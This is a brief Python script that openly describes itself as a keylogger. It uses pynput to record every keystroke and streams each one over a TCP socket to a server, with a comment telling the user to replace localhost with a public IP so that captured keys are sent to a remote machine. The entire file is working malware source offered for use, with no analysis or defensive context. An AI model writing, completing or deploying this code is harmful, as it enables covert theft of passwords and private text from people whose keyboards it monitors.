from pynput.keyboard import Key, Listener
import socket

# Define server address and port
SERVER_HOST = 'localhost'  # Replace with your public IP address
SERVER_PORT = 12345

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_HOST, SERVER_PORT))

def on_press(key):
    try:
        client_socket.send(str(key).encode())
    except Exception as e:
        print(f'Error: {e}')

with Listener(on_press=on_press) as listener:
    print('Keylogger started.')
    listener.join()

client_socket.close()
